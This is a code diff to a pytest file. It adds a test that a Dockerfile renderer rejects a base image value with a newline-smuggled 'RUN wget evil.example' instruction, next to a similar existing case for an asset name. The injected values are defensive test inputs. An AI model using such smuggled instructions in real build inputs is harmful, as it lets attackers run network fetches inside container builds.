@@ -794,6 +794,10 @@ def test_dockerfile_renderer_rejects_instruction_injection(tmp_path: Path):
         render_mcp_sidecar_dockerfile(
             runtime_assets=(RuntimeAsset("ops.py\nRUN wget evil.example", dummy),)
         )
+    with pytest.raises(SubstrateError, match="base image"):
+        render_mcp_sidecar_dockerfile(
+            base_image=DEFAULT_PINNED_BASE_IMAGE + "\nRUN wget evil.example"
+        )
 
 
 def test_runtime_asset_rejects_dockerignore_and_casefold_collisions(tmp_path: Path):
